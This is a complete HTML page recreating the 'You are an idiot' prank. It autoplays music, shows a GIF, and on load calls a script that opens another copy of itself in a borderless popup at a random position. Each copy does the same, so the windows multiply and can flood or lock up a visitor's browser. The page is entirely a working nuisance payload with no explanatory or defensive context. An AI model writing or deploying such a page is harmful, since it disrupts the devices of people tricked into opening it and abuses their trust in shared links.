<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>You are an idiot</title>
    <style>
      body {
        background-color: white;
      }
      img {
        width: 100%;
        height: 100%;
      }
    </style>
  </head>
  <body onload="yes(1000,-1000)">
<audio src="music.mp3" autoplay>
<p>If you are reading this, it is because your browser does not support the audio element.     </p>
<embed src="music.mp3" width="180" height="90" hidden="true" />
</audio>
    <center>
      <img src="gif.gif" id="img" />
    </center>

    <script>
      function yes(max,min) {
        var l = Math.floor(Math.random() * (max - min + 1) ) + min;
        var t = Math.floor(Math.random() * (max - min + 1) ) + min;
        window.open(
          "index.html",
          "_blank",
          `menubar=no,status=no,toolbar=noresizable=no,width=300,height=275,titlebar=no,alwaysRaised=yes,left=${l},top=${t}`
        );
      }
    </script>
  </body>
</html>
